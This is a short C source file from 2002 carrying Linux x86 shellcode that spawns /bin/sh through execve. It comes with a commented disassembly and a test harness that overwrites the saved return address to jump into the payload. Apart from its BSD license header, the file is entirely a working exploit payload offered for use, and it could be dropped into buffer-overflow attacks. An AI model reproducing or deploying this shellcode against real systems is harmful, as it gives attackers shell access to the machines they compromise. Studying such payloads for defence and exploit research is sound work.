/*
 *  execve ("/bin/sh"..) (linux little endian)
 *
 *  Copyright (c) 2002 Angelo Dell'Aera <buffer@users.sourceforge.net>
 *
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTR@CT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 * 
 * 80483c3:       31 d2                   xor    %edx,%edx
 * 80483c5:       52                      push   %edx
 * 80483c6:       68 6e 2f 73 68          push   $0x68732f6e
 * 80483cb:       68 2f 2f 62 69          push   $0x69622f2f
 * 80483d0:       89 e3                   mov    %esp,%ebx
 * 80483d2:       52                      push   %edx
 * 80483d3:       53                      push   %ebx
 * 80483d4:       89 e1                   mov    %esp,%ecx
 * 80483d6:       6a 0b                   push   $0xb
 * 80483d8:       51                      push   %ecx
 * 80483d9:       52                      push   %edx
 * 80483da:       53                      push   %ebx
 * 80483db:       83 ec 10                sub    $0x10,%esp
 * 80483de:       61                      popa
 * 80483df:       cd 80                   int    $0x80
 *
 */

char shellcode[] = "\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
		   "\x52\x53\x89\xe1\x6a\x0b\x51\x52\x53\x83\xec\x10\x61\xcd\x80";

main() {
   long *ret;

   ret = (long *)&ret + 2;
   (*ret) = (long)shellcode;

}

